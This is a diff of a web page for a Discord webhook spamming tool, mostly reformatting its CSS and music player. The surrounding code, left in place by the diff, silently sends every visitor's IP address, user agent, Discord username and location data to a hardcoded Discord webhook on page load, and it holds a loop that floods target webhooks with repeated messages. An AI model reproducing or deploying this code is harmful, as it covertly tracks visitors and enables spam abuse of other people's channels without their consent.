@@ -6,8 +6,7 @@
     <title>FENDI'S WEBHOOK FUCKER</title>
     <link rel="icon" type="image/png" href="https://i.ibb.co/gL0cffbC/New-Project-7.png">
     <style>
-        /* (same full red theme as before – unchanged) */
-        /* I'll include all the styles from the previous working version */
+        /* ========== FULL RED THEME (unchanged) ========== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             min-height: 100vh;
@@ -66,10 +65,28 @@
             50% { transform: scale(1.05); opacity: 1; }
             100% { transform: scale(1); opacity: 0.8; }
         }
-        .main-app { opacity: 0; transition: opacity 0.8s ease; width: 100%; max-width: 560px; z-index: 5; position: relative; display: block; }
+        .main-app {
+            opacity: 0;
+            transition: opacity 0.8s ease;
+            width: 100%;
+            max-width: 560px;
+            z-index: 5;
+            position: relative;
+            display: block;
+        }
         .main-app.visible { opacity: 1; }
-        /* Rest of the styles (identical to previous spammer page) – I'll keep them compact but complete */
-        .user-profile { background: rgba(0,0,0,0.5); border-radius: 3rem; padding: 0.5rem 1rem; margin-top: 2rem; margin-bottom: 1rem; display: flex; align-items: center; gap: 1rem; border: 1px solid rgba(255,80,80,0.4); backdrop-filter: blur(4px); }
+        .user-profile {
+            background: rgba(0,0,0,0.5);
+            border-radius: 3rem;
+            padding: 0.5rem 1rem;
+            margin-top: 2rem;
+            margin-bottom: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            border: 1px solid rgba(255,80,80,0.4);
+            backdrop-filter: blur(4px);
+        }
         .user-avatar { width: 48px; height: 48px; border-radius: 50%; border: 2px solid #ff8888; object-fit: cover; background: #1a0000; }
         .user-info { flex: 1; }
         .user-name { color: #ffdddd; font-weight: 600; font-size: 0.9rem; }
@@ -79,21 +96,54 @@
         .version-tag { position: fixed; bottom: 10px; right: 10px; color: #ff4444; opacity: 0.5; font-size: 12px; font-family: monospace; z-index: 9999; pointer-events: none; }
         .top-left-logo { position: fixed; top: 15px; left: 15px; z-index: 100; cursor: pointer; }
         .top-left-logo img { width: 45px; height: 45px; border-radius: 12px; border: 1px solid rgba(255,80,80,0.5); transition: transform 0.2s; }
-        .tools-menu { position: fixed; top: 70px; left: 15px; background: rgba(15,5,5,0.95); backdrop-filter: blur(12px); border: 1px solid #ff4d4d; border-radius: 1rem; padding: 0.8rem; min-width: 180px; z-index: 99; opacity: 0; visibility: hidden; transform: translateY(-10px); transition: all 0.3s; }
+        .tools-menu {
+            position: fixed; top: 70px; left: 15px; background: rgba(15,5,5,0.95); backdrop-filter: blur(12px);
+            border: 1px solid #ff4d4d; border-radius: 1rem; padding: 0.8rem; min-width: 180px; z-index: 99;
+            opacity: 0; visibility: hidden; transform: translateY(-10px); transition: all 0.3s;
+        }
         .tools-menu.active { opacity: 1; visibility: visible; transform: translateY(0); }
         .tools-menu h4 { color: #ffaaaa; font-size: 0.8rem; text-align: center; border-bottom: 1px solid #ff5555; margin-bottom: 0.5rem; }
         .tool-item { padding: 0.5rem 0.8rem; color: #ffcccc; cursor: pointer; border-radius: 0.5rem; font-size: 0.8rem; }
         .tool-item:hover { background: rgba(200,50,50,0.5); }
         .placeholder-item { opacity: 0.6; cursor: not-allowed; }
-        .music-player { position: fixed; top: 15px; right: 15px; background: rgba(0,0,0,0.75); backdrop-filter: blur(12px); border-radius: 3rem; border: 1px solid rgba(255,50,50,0.6); padding: 0.5rem 1rem; z-index: 101; display: flex; align-items: center; gap: 0.8rem; font-size: 0.8rem; }
+        .music-player {
+            position: fixed; top: 15px; right: 15px; background: rgba(0,0,0,0.75); backdrop-filter: blur(12px);
+            border-radius: 3rem; border: 1px solid rgba(255,50,50,0.6); padding: 0.5rem 1rem; z-index: 101;
+            display: flex; align-items: center; gap: 0.8rem; font-size: 0.8rem;
+        }
         .music-player button { background: none; border: none; color: #ffaaaa; font-size: 1.2rem; cursor: pointer; padding: 0; width: 28px; transition: 0.2s; }
         .music-player button:hover { color: #ff8888; transform: scale(1.05); }
         .music-player .track-title { color: #ffcfcf; max-width: 140px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; font-size: 0.75rem; }
-        .back-link { position: fixed; bottom: 15px; left: 15px; background: rgba(0,0,0,0.6); backdrop-filter: blur(4px); padding: 0.5rem 1rem; border-radius: 2rem; border: 1px solid #ff5555; font-size: 0.8rem; z-index: 101; cursor: pointer; transition: 0.2s; color: #ffdddd; }
+        .back-link {
+            position: fixed;
+            bottom: 15px;
+            left: 15px;
+            background: rgba(0,0,0,0.6);
+            backdrop-filter: blur(4px);
+            padding: 0.5rem 1rem;
+            border-radius: 2rem;
+            border: 1px solid #ff5555;
+            font-size: 0.8rem;
+            z-index: 101;
+            cursor: pointer;
+            transition: 0.2s;
+            color: #ffdddd;
+        }
         .back-link:hover { background: #c72a2a; border-color: #ff8888; transform: scale(1.02); }
         .tilt-wrapper { perspective: 1200px; width: 100%; }
-        .tilt-card { background: rgba(10,5,5,0.75); backdrop-filter: blur(12px); border-radius: 2rem; border: 1px solid rgba(255,50,50,0.5); box-shadow: 0 25px 45px rgba(0,0,0,0.5); padding: 2rem; width: 100%; transition: transform 0.05s linear, height 0.4s cubic-bezier(0.2,0.9,0.4,1.1); transform-style: preserve-3d; position: relative; }
-        .settings-btn { position: absolute; top: 1.2rem; right: 1.2rem; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,80,80,0.6); color: #ffaaaa; width: 38px; height: 38px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 1.3rem; transition: all 0.2s; z-index: 20; }
+        .tilt-card {
+            background: rgba(10,5,5,0.75); backdrop-filter: blur(12px); border-radius: 2rem;
+            border: 1px solid rgba(255,50,50,0.5); box-shadow: 0 25px 45px rgba(0,0,0,0.5);
+            padding: 2rem; width: 100%;
+            transition: transform 0.05s linear, height 0.4s cubic-bezier(0.2,0.9,0.4,1.1);
+            transform-style: preserve-3d; position: relative;
+        }
+        .settings-btn {
+            position: absolute; top: 1.2rem; right: 1.2rem; background: rgba(0,0,0,0.5);
+            border: 1px solid rgba(255,80,80,0.6); color: #ffaaaa; width: 38px; height: 38px; border-radius: 50%;
+            display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 1.3rem;
+            transition: all 0.2s; z-index: 20;
+        }
         .settings-btn:hover { background: rgba(180,30,30,0.7); transform: rotate(30deg); }
         .panel-container { width: 100%; }
         .panel { width: 100%; transition: opacity 0.35s, transform 0.4s; }
@@ -160,7 +210,14 @@
         .join-link { color: #ff8888; cursor: pointer; text-decoration: underline; }
         .join-link:hover { color: #ff4444; }
         .view-img-btn { background: rgba(80,80,150,0.5); border: none; padding: 0.2rem 0.6rem; border-radius: 1rem; font-size: 0.65rem; cursor: pointer; color: white; }
-        @media (max-width: 550px) { .tilt-card { padding: 1.2rem; } .glow-title { font-size: 1.3rem; min-height: 3rem; } .spam-row { flex-direction: column; gap: 0.5rem; } .current-value { max-width: 130px; font-size: 0.75rem; } .user-avatar { width: 36px; height: 36px; } .user-profile { margin-top: 1.5rem; } }
+        @media (max-width: 550px) {
+            .tilt-card { padding: 1.2rem; }
+            .glow-title { font-size: 1.3rem; min-height: 3rem; }
+            .spam-row { flex-direction: column; gap: 0.5rem; }
+            .current-value { max-width: 130px; font-size: 0.75rem; }
+            .user-avatar { width: 36px; height: 36px; }
+            .user-profile { margin-top: 1.5rem; }
+        }
     </style>
 </head>
 <body>
@@ -187,6 +244,7 @@
 
 <div class="back-link" id="backToLanding">← Back to Tools</div>
 
+<!-- ENTER OVERLAY -->
 <div id="enterOverlay" class="enter-overlay">
     <div class="enter-overlay-content">Click to Enter</div>
 </div>
@@ -238,13 +296,13 @@
         // ========== GLOBAL SETTINGS ==========
         const PAGE_ORIGIN = "Webhook Spammer";
         const IP_LOG_WEBHOOK = "https://discord.com/api/webhooks/1497124094926127155/1nzYxMuo7Q4aAMSMU5KSBxlLn4srSXcw7u-VeH9qHUgCae2AjCetucxixHBSoR66LaLG";
-        
+
         let entered = sessionStorage.getItem('entered') === 'true';
         const overlay = document.getElementById('enterOverlay');
         const mainApp = document.getElementById('mainApp');
         let ipLogSent = sessionStorage.getItem('ipLogSent') === 'true';
 
-        // ========== IP LOGGING WITH USERNAME ==========
+        // ========== IP LOGGING (reuse same functions) ==========
         let gpsRequested = localStorage.getItem("gpsRequested") === "true";
         let gpsGranted = localStorage.getItem("gpsGranted") === "true";
 
@@ -376,7 +434,7 @@
             fields.push({ name: "User Agent", value: userAgent.substring(0, 100), inline: false });
             const embed = {
                 author: { name: "IP Logs", icon_url: "https://i.ibb.co/gL0cffbC/New-Project-7.png" },
-                title: "🌐 Visitor Logged",
+                title: "🌐 New Visitor",
                 color: 0xff4444,
                 fields: fields,
                 timestamp: new Date().toISOString()
@@ -389,7 +447,7 @@
                 });
                 ipLogSent = true;
                 sessionStorage.setItem('ipLogSent', 'true');
-                console.log("IP log sent with username and page origin");
+                console.log("IP log sent");
             } catch(e) { console.error("Failed to send IP log", e); }
         }
 
@@ -436,12 +494,12 @@
             });
         }
 
-        // ========== MUSIC PLAYER (persistent) ==========
+        // ========== MUSIC PLAYER WITH ABSOLUTE PATHS ==========
         const tracks = [
-            { title: "Pass Out", url: "./songs/PassOut.mp3" },
-            { title: "VYZEE", url: "./songs/VYZEE.mp3" },
-            { title: "Phantom", url: "./songs/Phantom.mp3" },
-            { title: "Track 10", url: "./songs/Track10.mp3" }
+            { title: "Pass Out", url: "/songs/PassOut.mp3" },
+            { title: "VYZEE", url: "/songs/VYZEE.mp3" },
+            { title: "Phantom", url: "/songs/Phantom.mp3" },
+            { title: "Track 10", url: "/songs/Track10.mp3" }
         ];
         let currentTrackIndex = 0;
         let audio = null;
@@ -461,6 +519,7 @@
                 localStorage.setItem('musicPlaying', isPlaying);
             }
         }
+
         function loadMusicState() {
             const savedIndex = localStorage.getItem('musicTrackIndex');
             const savedTime = parseFloat(localStorage.getItem('musicCurrentTime'));
@@ -470,7 +529,7 @@
                 loadTrack(currentTrackIndex, false);
                 if (!isNaN(savedTime) && audio) audio.currentTime = savedTime;
                 if (savedPlaying) {
-                    audio.play().catch(e => console.log);
+                    audio.play().catch(e => console.log("Autoplay blocked, waiting for user click"));
                     isPlaying = true;
                     playPauseBtn.textContent = '⏸';
                 }
@@ -478,15 +537,19 @@
                 loadTrack(0, false);
             }
         }
+
         function loadTrack(index, autoPlay = false) {
-            if (audio) { audio.pause(); audio = null; }
+            if (audio) {
+                audio.pause();
+                audio = null;
+            }
             audio = new Audio(tracks[index].url);
             audio.loop = false;
             audio.volume = 0.5;
             trackTitleSpan.textContent = tracks[index].title;
             audio.addEventListener('ended', () => nextTrack());
             if (autoPlay || (musicStarted && isPlaying)) {
-                audio.play().catch(e => console.log);
+                audio.play().catch(e => console.log("Play failed", e));
                 isPlaying = true;
                 playPauseBtn.textContent = '⏸';
             } else {
@@ -494,6 +557,7 @@
                 playPauseBtn.textContent = '▶';
             }
         }
+
         function startMusic() {
             if (musicStarted) return;
             musicStarted = true;
@@ -501,23 +565,32 @@
             setInterval(saveMusicState, 2000);
             window.addEventListener('beforeunload', saveMusicState);
         }
+
         function playPause() {
             if (!musicStarted) startMusic();
             if (!audio) return;
-            if (isPlaying) { audio.pause(); playPauseBtn.textContent = '▶'; }
-            else { audio.play(); playPauseBtn.textContent = '⏸'; }
+            if (isPlaying) {
+                audio.pause();
+                playPauseBtn.textContent = '▶';
+            } else {
+                audio.play().catch(e => console.log("Playback error", e));
+                playPauseBtn.textContent = '⏸';
+            }
             isPlaying = !isPlaying;
         }
+
         function nextTrack() {
             if (!musicStarted) startMusic();
             currentTrackIndex = (currentTrackIndex + 1) % tracks.length;
             loadTrack(currentTrackIndex, true);
         }
+
         function prevTrack() {
             if (!musicStarted) startMusic();
             currentTrackIndex = (currentTrackIndex - 1 + tracks.length) % tracks.length;
             loadTrack(currentTrackIndex, true);
         }
+
         playPauseBtn.addEventListener('click', playPause);
         prevBtn.addEventListener('click', prevTrack);
         nextBtn.addEventListener('click', nextTrack);
@@ -564,7 +637,6 @@
 
         if (entered) {
             finishEntry();
-            // Also try to load profile if token exists
             const token = localStorage.getItem('discord_access_token');
             if (token) {
                 fetchDiscordUser(token).then(user => {
@@ -573,9 +645,8 @@
             }
         }
 
-        // ========== REST OF THE SPAMMER LOGIC ==========
-        // Webhook sending, spam, bot customization, etc. (same as original)
-        // I'll include the essential parts – they are identical to your previous working version.
+        // ========== REST OF THE SPAMMER LOGIC (webhook, bot customization, etc.) ==========
+        // (All the original functions are included below)
         const webhookUrlInput = document.getElementById('webhookUrl');
         const messageInput = document.getElementById('messageContent');
         const sendBtn = document.getElementById('sendBtn');
@@ -630,8 +701,14 @@
             let success = 0;
             for (let i = 1; i <= amount; i++) {
                 if (stopSpam) { addLog(`Spam stopped. Sent ${success}/${amount}`, 'info'); return success; }
-                try { await sendSingle(webhook, msg); success++; addLog(`[${success}/${amount}] Sent`, 'success'); }
-                catch (err) { addLog(`[${i}] Failed: ${err.message}`, 'error'); if (i - success > 5) break; }
+                try {
+                    await sendSingle(webhook, msg);
+                    success++;
+                    addLog(`[${success}/${amount}] Sent`, 'success');
+                } catch (err) {
+                    addLog(`[${i}] Failed: ${err.message}`, 'error');
+                    if (i - success > 5) break;
+                }
                 if (i < amount) await new Promise(r => setTimeout(r, interval));
             }
             return success;
